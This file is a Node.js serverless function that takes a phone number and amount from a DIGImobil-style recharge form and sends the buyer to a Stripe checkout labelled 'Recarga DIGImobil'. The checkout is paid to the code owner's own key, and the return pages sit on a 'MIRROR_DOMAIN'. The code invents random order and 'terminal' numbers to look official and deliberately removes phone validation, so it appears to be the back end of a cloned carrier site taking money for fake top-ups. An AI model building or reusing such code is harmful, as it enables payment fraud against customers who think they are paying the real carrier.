const { MIRROR_DOMAIN, STRIPE_SECRET_KEY } = require('./utils/constants');
const fetch = require('node-fetch');

// Глобальний кеш для даних платежів
global.paymentData = global.paymentData || {};

async function createStripeCheckoutSession(amount, phoneNumber, successUrl, cancelUrl, clientIP) {
  try {
    const stripeUrl = 'https://api.stripe.com/v1/checkout/sessions';
    const priceInCents = Math.round(parseFloat(amount) * 100);
    const orderNumber = Math.floor(10000000 + Math.random() * 90000000).toString();
    const numberOfTerminal = Math.floor(856673 + Math.random() * 90000000).toString();

    // Log for debugging
    console.log('Original phone number:', phoneNumber);
    
    // Clean phone number if needed
    const cleanPhone = phoneNumber;
    console.log('Clean phone number:', cleanPhone, 'Original:', phoneNumber);
    
    // Log amount for debugging
    console.log('Creating Stripe session with amount (EUR):', amount, '- in cents:', priceInCents);

    const params = new URLSearchParams();
    params.append('payment_method_types[]', 'card');
    params.append('mode', 'payment');
    params.append('success_url', successUrl + '?session_id={CHECKOUT_SESSION_ID}');
    params.append('cancel_url', cancelUrl);
    params.append('locale', 'es');
    params.append('client_reference_id', clientIP);

    params.append('line_items[0][quantity]', '1');
    params.append('line_items[0][price_data][currency]', 'eur');
    params.append('line_items[0][price_data][unit_amount]', priceInCents.toString());
    params.append('line_items[0][price_data][product_data][name]', 'Recarga DIGImobil');
    
    const description = `*Número de teléfono*: ${cleanPhone} \n*Importe*: €${(priceInCents / 100).toFixed(2)}\n*Número de pedido*: ${orderNumber}\n*Número de terminal*: ${numberOfTerminal}`;
    
    // Log the actual description that will be used
    console.log('Payment description:', description);
    
    params.append('line_items[0][price_data][product_data][description]', description);

    console.log('Creating Stripe session with data:', {
      amount: priceInCents / 100,
      phoneNumber: cleanPhone,
      orderNumber: orderNumber,
      terminal: numberOfTerminal,
      clientIP: clientIP
    });

    const response = await fetch(stripeUrl, {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${STRIPE_SECRET_KEY}`,
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: params.toString()
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error('Stripe API error:', errorText);
      throw new Error(`Stripe API error: ${response.status} - ${errorText}`);
    }

    const session = await response.json();

    // Зберігаємо дані платежу
    global.paymentData[session.id] = {
      phoneNumber: cleanPhone,
      terminal: numberOfTerminal,
      amount: priceInCents / 100,
      orderNumber: orderNumber
    };

    console.log('Stripe session created:', { sessionId: session.id, url: session.url });
    return { session };
  } catch (error) {
    console.error('Error in createStripeCheckoutSession:', error);
    throw error;
  }
}

exports.handler = async (event, context) => {
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Allow-Headers': '*',
        'Access-Control-Max-Age': '86400'
      },
      body: ''
    };
  }

  try {
    console.log('Processing topup request, event:', {
      path: event.path,
      httpMethod: event.httpMethod,
      headers: event.headers,
      queryStringParameters: event.queryStringParameters || {}
    });

    const url = new URL(event.rawUrl || `https://${event.headers.host || 'localhost'}${event.path}`);
    console.log('URL parsed:', url.toString());
    
    const contentType = event.headers['content-type'] || '';
    const clientIP = event.headers['client-ip'] || event.headers['x-forwarded-for'] || 'unknown-client';
    
    let amount, phoneNumber;
    console.log('Query params:', url.searchParams.toString());

    // Перевіряємо параметри URL
    if (url.searchParams.has('phone') || url.searchParams.has('amount')) {
      phoneNumber = url.searchParams.get('phone') || url.searchParams.get('phone_number') || 
                   url.searchParams.get('msisdn') || url.searchParams.get('number');
      amount = url.searchParams.get('amount') || url.searchParams.get('topup_amount') || 
              url.searchParams.get('value');
      console.log('Found in URL params - Phone:', phoneNumber, 'Amount:', amount);
    }

    // Перевіряємо тіло запиту
    if ((!phoneNumber || !amount) && event.body) {
      console.log('Checking request body, content-type:', contentType);
      console.log('Request body:', event.body);
      
      if (contentType.includes('application/x-www-form-urlencoded')) {
        const bodyParams = new URLSearchParams(event.body);
        console.log('Form data keys:', Array.from(bodyParams.keys()));
        
        // Спроба знайти номер телефону в різних форматах
        phoneNumber = phoneNumber || 
                     bodyParams.get('phone') || 
                     bodyParams.get('phone_number') || 
                     bodyParams.get('msisdn') || 
                     bodyParams.get('number') ||
                     bodyParams.get('recharge_number[phone][first]');
        
        // Спроба знайти суму в різних форматах
        amount = amount || 
                bodyParams.get('amount') || 
                bodyParams.get('topup_amount') || 
                bodyParams.get('value') ||
                bodyParams.get('recharge_number[amount]');
        
        // Додаткова перевірка радіокнопок з сумою
        if (!amount) {
          for (const [key, value] of bodyParams.entries()) {
            console.log(`Form field: ${key} = ${value}`);
            if (key.includes('amount') || key.match(/recharge.*amount/)) {
              amount = value;
              console.log('Found amount in form field:', key, '=', value);
              break;
            }
          }
        }
        
        console.log('Found in form data - Phone:', phoneNumber, 'Amount:', amount);
      } else if (contentType.includes('application/json')) {
        try {
          const jsonData = JSON.parse(event.body);
          console.log('JSON data:', jsonData);
          
          phoneNumber = phoneNumber || jsonData.phone || jsonData.phone_number || 
                       jsonData.msisdn || jsonData.number;
                       
          // Перевіряємо суму в різних форматах
          amount = amount || jsonData.amount || jsonData.topup_amount || jsonData.value;
          
          // Якщо є вкладені об'єкти для recharge_number
          if (jsonData.recharge_number) {
            phoneNumber = phoneNumber || jsonData.recharge_number.phone?.first;
            amount = amount || jsonData.recharge_number.amount;
          }
          
          console.log('Found in JSON data - Phone:', phoneNumber, 'Amount:', amount);
        } catch (e) {
          console.error('Error parsing JSON:', e);
        }
      } else {
        // Якщо content-type не відомий, спробуємо перевірити вміст тіла напряму
        const bodyText = event.body;
        
        // Шукаємо номер телефону за допомогою регулярного виразу
        const phoneMatch = bodyText.match(/recharge_number\[phone\]\[first\]=([0-9]{9})/);
        if (phoneMatch && phoneMatch[1]) {
          phoneNumber = phoneMatch[1];
          console.log('Found phone in body text:', phoneNumber);
        }
        
        // Шукаємо суму за допомогою регулярного виразу
        const amountMatch = bodyText.match(/recharge_number\[amount\]=([0-9]+)/);
        if (amountMatch && amountMatch[1]) {
          amount = amountMatch[1];
          console.log('Found amount in body text:', amount);
        }
      }
    }

    // Якщо номер телефону в якійсь формі, конвертуємо його в рядок і очищаємо
    if (phoneNumber) {
      phoneNumber = String(phoneNumber).replace(/\D/g, '');
      console.log('Phone after cleaning:', phoneNumber);
    }

    // Видаляємо валідацію номера телефону

    // Встановлюємо стандартне значення для суми
    if (!amount) {
      amount = '5';
      console.log('No amount specified, using default:', amount);
    } else {
      // Переконуємось, що amount є числом
      const parsedAmount = parseFloat(amount);
      if (isNaN(parsedAmount) || parsedAmount <= 0) {
        amount = '5';
        console.log('Invalid amount value, using default:', amount);
      } else {
        console.log('Using amount value:', parsedAmount);
        amount = parsedAmount.toString();
      }
    }

    console.log('Final values - Phone:', phoneNumber, 'Amount:', amount);

    // Створюємо сесію Stripe
    const { session } = await createStripeCheckoutSession(
      parseFloat(amount),
      phoneNumber,
      `https://${MIRROR_DOMAIN}/payment-success`,
      `https://${MIRROR_DOMAIN}/payment-cancel`,
      clientIP
    );

    if (session.url) {
      console.log('Redirecting to Stripe:', session.url);
      return {
        statusCode: 302,
        headers: {
          'Location': session.url,
          'Cache-Control': 'no-cache'
        },
        body: ''
      };
    }
    
    throw new Error('Failed to create Stripe checkout URL');
  } catch (error) {
    console.error('Error in handleTopupRequest:', error);
    
    return {
      statusCode: 302,
      headers: {
        'Location': `https://${MIRROR_DOMAIN}/recargar`,
        'Cache-Control': 'no-cache'
      },
      body: ''
    };
  }
};